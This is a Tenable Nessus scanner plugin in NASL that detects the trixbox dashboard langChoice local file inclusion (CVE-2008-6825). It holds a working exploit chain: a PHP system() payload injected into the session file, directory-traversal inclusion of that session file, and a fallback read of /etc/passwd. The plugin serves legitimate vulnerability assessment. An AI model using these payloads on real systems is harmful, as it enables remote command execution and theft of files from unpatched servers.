#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(33445);
  script_version("$Revision: 1.24 $");
  script_cvs_date("$Date: 2016/11/03 14:16:36 $");

  script_cve_id("CVE-2008-6825");
  script_bugtraq_id(30135);
  script_osvdb_id(50421);
  script_xref(name:"EDB-ID", value:"6026");

  script_name(english:"trixbox Dashboard user/index.php langChoice Parameter Local File Inclusion");
  script_summary(english:"Tries to read /etc/passwd");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is susceptible to a
local file include attack.");
  script_set_attribute(attribute:"description", value:
"The version of trixbox dashboard installed on the remote host fails to
sanitize user-supplied input to the 'langChoice' parameter of the
'user/index.php' script before using it to include PHP code.
Regardless of PHP's 'register_globals' setting, an unauthenticated
attacker could leverage this issue to view arbitrary files or to
execute arbitrary PHP code on the remote host, subject to the
privileges of the web server user id.");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/fulldisclosure/2008/Jul/102");
  # http://web.archive.org/web/20090525044133/http://trixbox.org/devblog/security-vulnerability-2-6-1
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?9c891c97" );
  script_set_attribute(attribute:"solution", value:
"Versions 2.6.1 and prior are reportedly affected by the issue
referenced above. Consequently, refer to the vendor for patch and/or
upgrade options.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Trixbox langChoice PHP Local File Inclusion');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
  script_cwe_id(22);

  script_set_attribute(attribute:"plugin_publication_date", value:"2008/07/09");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:fonality:trixbox");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2016 Tenable Network Security, Inc.");

  script_dependencies("trixbox_web_detect.nbin");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP", "www/trixbox");
  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:80, php:TRUE);
get_kb_item_or_exit("www/trixbox");

cmd = "id";
cmd_pat = "uid=[0-9]+.*gid=[0-9]+.*";
file = "/etc/passwd";
file_pat = "root:.*:0:[01]:";

# Loop through directories.
if (thorough_tests) dirs = list_uniq("/user", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Determine if the script exists.
  url = dir + "/index.php";

  r = http_send_recv3(method: "GET", item:url, port:port, exit_on_fail:TRUE);

  # If it does...
  if (
    'form name="langForm"' >< r[2] &&
    'name="langChoice"' >< r[2]
  )
  {
    # Try to identify the default language.
    default_language = "";

    pat = 'option value="([^"]+)" selected="selected"';
    matches = egrep(pattern:pat, string:r[2]);
    if (matches)
    {
      foreach match (split(matches))
      {
        match = chomp(match);
        item = eregmatch(pattern:pat, string:match);
        if (!isnull(item))
        {
          default_language = item[1];
          break;
        }
      }
    }
    if (!default_language) default_language = "english";

    report = "";
    vuln = FALSE;

    # Try to exploit the issue to execute a command.
    #
    # - first, inject the PHP code into the session file.
    exploit = "<?php system('" + cmd + "'); ?>%00";
    postdata = "langChoice=" + exploit;

    r = http_send_recv3(method: "POST", item: url, data: postdata, port: port,
      content_type: "application/x-www-form-urlencoded", exit_on_fail:TRUE);

    # - next, figure out our session id.
    cookie = get_http_cookie(name: "PHPSESSID");
    # - now call the session file.
    if (!isnull(cookie))
    {
      exploit = "../../../../../../../../../../../../tmp/sess_" +cookie+ "%00";
      postdata2 = "langChoice=" + exploit;

      r = http_send_recv3(method: "POST", item: url, data: postdata2, port: port, content_type: "application/x-www-form-urlencoded", exit_on_fail:TRUE);

      if (egrep(pattern:cmd_pat, string:r[2]))
      {
        if (report_verbosity)
        {
          report =
            '\n' +
            'Nessus was able to execute the command "' +cmd+ '" on the remote \n'+
            'host using the following URL :\n' +
            '\n' +
            build_url(port:port, qs:url) + '\n'+
            '\n'+
            'first with the following POST data :\n'+
            '\n'+
            '  ' + str_replace(find:"&", replace:'\n  ', string:postdata) + '\n'+
            '\n'+
            'and then again with the following POST data :\n'+
            '\n'+
            '  ' + str_replace(find:"&", replace:'\n  ', string:postdata2) + '\n';
          if (report_verbosity > 1)
          {
            output = "";
            if ("trixbox_Language|s:" >< r[2])
            {
              output = strstr(r[2], "trixbox_Language|s:") - "trixbox_Language|s:";
              output = strstr(output, ':"') - ':"';
              output = output - strstr(output, '\x00');
            }
            if (!output || !egrep(pattern:cmd_pat, string:output)) output = r[2];

            report =
              report+
              '\n'+
              'This produced the following output :\n'+
              '\n'+
              ' ' + output;
          }
        }
        vuln = TRUE;
      }
    }

    # If that failed, try to retrieve a local file.
    if (!vuln)
    {
      exploit = "../../../../../../../../../../../.." + file + "%00";
      postdata3 = "langChoice=" + exploit;

      r = http_send_recv3(method: "POST", item: url, data: postdata3, port: port, content_type: "application/x-www-form-urlencoded", exit_on_fail : TRUE);

      # There's a problem if...
      if (
        # there's an entry for root or...
        egrep(pattern:file_pat, string:r[2]) ||
        # we get an error because magic_quotes was enabled or...
        "(includes/language/" + file +"\\0" >< r[2] ||
        # we get an error claiming the file doesn't exist or...
        "(includes/language/" + file >< r[2] ||
        # we get an error about open_basedir restriction.
        "open_basedir restriction in effect. File(" + file >< r[2]
      )
      {
        if (report_verbosity && egrep(pattern:file_pat, string:r[2]))
        {
          output = "";
          if ("<!DOCTYPE" >< r[2]) output = r[2] - strstr(r[2], "<!DOCTYPE");
          if (!egrep(pattern:file_pat, string:output)) output = r[2];

          report =
            '\n' +
            'Here are the (repeated) contents of the file "' + file + '" that\n'+
            'Nessus was able to read from the remote host :\n'+
            '\n' +
            output;
        }
        vuln = TRUE;
      }
    }

    # Reset the language in the 'cache/sessionsFile.txt' in case it was changed.
    postdata4 = "langChoice=" + default_language;

    r = http_send_recv3(method: "POST", item: url, data: postdata4, port: port, content_type: "application/x-www-form-urlencoded", exit_on_fail:TRUE);

    # Issue a report if a problem was found.
    if (vuln)
    {
      if (report) security_hole(port:port, extra:report);
      else security_hole(port);
      exit(0);
    }
  }
}
if (!vuln)
  audit(AUDIT_WEB_APP_NOT_AFFECTED, "trixbox", build_url(qs:'/', port:port));
